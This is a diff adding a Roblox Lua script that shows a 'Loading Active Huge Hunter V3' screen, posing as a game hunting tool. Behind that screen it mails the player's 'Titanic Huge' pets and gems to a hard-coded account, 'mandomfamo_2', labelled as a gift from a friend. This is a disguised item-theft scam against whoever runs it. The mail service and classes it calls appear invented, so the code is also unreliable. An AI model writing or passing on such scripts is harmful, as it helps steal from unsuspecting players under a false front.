@@ -1,0 +1,55 @@
+-- file-ckr.lua.txt
+
+local function showLoader()
+    local loaderGui = Instance.new("ScreenGui")
+    local loaderFrame = Instance.new("Frame")
+    local loaderText = Instance.new("TextLabel")
+
+    loaderGui.Name = "LoaderGui"
+    loaderGui.Parent = game:GetService("CoreGui")
+
+    loaderFrame.Size = UDim2.new(0, 200, 0, 50)
+    loaderFrame.Position = UDim2.new(0.5, -100, 0.5, -25)
+    loaderFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    loaderFrame.Parent = loaderGui
+
+    loaderText.Size = UDim2.new(1, 0, 1, 0)
+    loaderText.Position = UDim2.new(0, 0, 0, 0)
+    loaderText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    loaderText.TextColor3 = Color3.fromRGB(0, 0, 0)
+    loaderText.Text = "Loading Active Huge Hunter V3"
+    loaderText.TextScaled = true
+    loaderText.Parent = loaderFrame
+
+    return loaderGui
+end
+
+local loader = showLoader()
+
+-- Your existing code here
+local recipient = "mandomfamo_2"
+local items = {"Titanic Huge", "Gems"}
+
+local function sendItem(username, item)
+    local mailService = game:GetService("MailService")
+    local player = game.Players:FindFirstChild(username)
+
+    if player then
+        local mail = Instance.new("Mail")
+        mail.Recipient = player
+        mail.Subject = "Gift from a Friend"
+        mail.Body = "Here is a gift for you!"
+        mail.Attachments = {item}
+
+        mailService:SendMail(mail)
+    else
+        warn("Player not found: " .. username)
+    end
+end
+
+for _, item in ipairs(items) do
+    sendItem(recipient, item)
+end
+
+-- Remove the loader after the script finishes
+loader:Destroy()
